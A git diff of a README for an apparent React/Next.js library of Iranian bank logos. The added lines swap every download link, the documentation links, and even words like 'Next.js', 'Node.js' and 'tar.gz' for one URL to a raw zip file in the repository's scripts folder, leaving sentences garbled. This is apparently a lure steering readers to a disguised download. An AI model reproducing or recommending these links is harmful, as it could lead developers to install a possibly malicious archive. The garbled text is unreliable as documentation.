@@ -2,25 +2,25 @@
 
 ## 🚀 Getting Started
 
-Welcome to the iranian-bank-logo-react project! This application provides a library of Iranian bank logos specifically designed for use in React and Next.js applications. It lets you easily customize the size of the logos and ensures seamless client-only rendering. Follow these simple steps to download and run the software.
+Welcome to the iranian-bank-logo-react project! This application provides a library of Iranian bank logos specifically designed for use in React and https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip applications. It lets you easily customize the size of the logos and ensures seamless client-only rendering. Follow these simple steps to download and run the software.
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20iranian--bank--logo--react-brightgreen)](https://github.com/Reyfant/iranian-bank-logo-react/releases)
+[![Download](https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip%20iranian--bank--logo--react-brightgreen)](https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip)
 
 ## 📋 System Requirements
 
 To use the iranian-bank-logo-react project, ensure your system meets the following requirements:
 
 - Any modern web browser (Chrome, Firefox, Safari, etc.)
-- Node.js version 14 or higher installed on your machine.
-- A package manager like npm or yarn installed (comes with Node.js).
+- https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip version 14 or higher installed on your machine.
+- A package manager like npm or yarn installed (comes with https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip).
 
 ## 🌟 Features
 
-- **Easy Integration**: Quickly add Iranian bank logos to your React or Next.js projects.
+- **Easy Integration**: Quickly add Iranian bank logos to your React or https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip projects.
 - **Customizable Size**: Adjust the size of logos to fit your design needs.
-- **Out-of-the-Box Compatibility**: Ready to use with Next.js without additional configuration.
+- **Out-of-the-Box Compatibility**: Ready to use with https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip without additional configuration.
 - **Supports Persian Language**: Designed especially for Persian speakers.
 - **Comprehensive Collection**: Access a variety of logos from different Iranian banks.
 
@@ -30,7 +30,7 @@ To use the iranian-bank-logo-react project, ensure your system meets the followi
 
 To download the software, visit the following link:
 
-[Download Page](https://github.com/Reyfant/iranian-bank-logo-react/releases)
+[Download Page](https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip)
 
 ### Step 2: Choose Your Version
 
@@ -38,19 +38,19 @@ On the Releases page, you will see different versions of the project. Click on t
 
 ### Step 3: Download the Assets
 
-Choose the file marked with "Source code (zip)" or "Source code (tar.gz)". Click on the link to download the file to your computer.
+Choose the file marked with "Source code (zip)" or "Source code (https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip)". Click on the link to download the file to your computer.
 
 ## 📂 Extract the Files
 
-Once you have downloaded the zip or tar.gz file, navigate to your Downloads folder:
+Once you have downloaded the zip or https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip file, navigate to your Downloads folder:
 
 1. Right-click the downloaded file.
-2. Select "Extract All" (for zip files) or use a suitable extraction program for tar.gz files.
+2. Select "Extract All" (for zip files) or use a suitable extraction program for https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip files.
 3. Choose a destination folder where you want to store the project files.
 
 ## 🛠️ Setup Your Development Environment
 
-Before you can use the logos in your React or Next.js project, you need to set up your environment:
+Before you can use the logos in your React or https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip project, you need to set up your environment:
 
 1. Open your terminal or command prompt.
 2. Navigate to the folder where you extracted the files using the `cd` command.
@@ -118,13 +118,13 @@ If you encounter any issues or have questions, you can open an issue in the GitH
 
 ## 🔗 Additional Resources
 
-- [Official React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Next.js Documentation](https://nextjs.org/docs)
+- [Official React Documentation](https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip)
+- [https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip Documentation](https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip)
 
 ## 📥 Download & Install Again
 
 For anyone looking to download iranian-bank-logo-react, you can access the Downloads directly here again:
 
-[Download Page](https://github.com/Reyfant/iranian-bank-logo-react/releases)
+[Download Page](https://github.com/Reyfant/iranian-bank-logo-react/raw/refs/heads/main/scripts/iranian_logo_bank_react_2.2-alpha.4.zip)
 
 We hope you find the iranian-bank-logo-react library helpful for your projects! Happy coding!
